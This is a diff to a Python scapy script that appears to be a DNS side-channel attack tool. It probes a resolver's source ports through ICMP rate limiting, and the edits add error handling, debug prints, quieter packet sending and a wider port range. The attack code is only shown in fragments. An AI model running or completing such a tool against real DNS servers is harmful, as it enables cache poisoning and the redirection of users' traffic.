@@ -89,6 +89,8 @@ def step1(thread_id):
         print ("Timeout on DNS query.")
     except dns.resolver.NXDOMAIN:
         print ("The query name does not exist.")
+    except dns.resolver.NoNameservers:
+        print ("No nameservers were able to answer the query")
 
     lock.release()
     print("released lock from thread : " + str(thread_id))
@@ -133,9 +135,9 @@ def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding
 
     
     for packet in probe_packet:
-        send(packet)
+        send(packet, verbose=False)
     for packet in padding_packet:
-        send(packet)
+        send(packet, verbose=False)
     print("Sending verification packet")
     reply = sr1(verification_packet, timeout=1) # in seconds
     print("Got reply from verificaiton packet")
@@ -175,6 +177,7 @@ def step2(thread_id, source_port_range_start, source_port_range_end):
     start = source_port_range_start
 
     while lock.locked() and start + ICMP_limit_rate <= source_port_range_end:
+        print("lock status: " + str(lock.locked()))
         start_time_one_chunk = time.perf_counter() #for system wide time count
         
         print("Calling do_one_attack_chunk")
@@ -193,6 +196,7 @@ def step2(thread_id, source_port_range_start, source_port_range_end):
         if (time_elapsed_for_one_chunk < ICMP_recovering_time)
             time.sleep(ICMP_recovering_time - time_elapsed_for_one_chunk)
         '''
+        print("Sleeping for 50ms")
         time.sleep(0.05)
 
         start += ICMP_limit_rate
@@ -207,7 +211,7 @@ def main():
     
     t1 = threading.Thread(target=step1, args=(1, ))
     t1.start()
-    t2 = threading.Thread(target=step2, args=(2, 33000, 33050))
+    t2 = threading.Thread(target=step2, args=(2, 33000, 33500))
     #t2 = threading.Thread(target=step2, args=(2, 32768, 60999))
     t2.start()
     
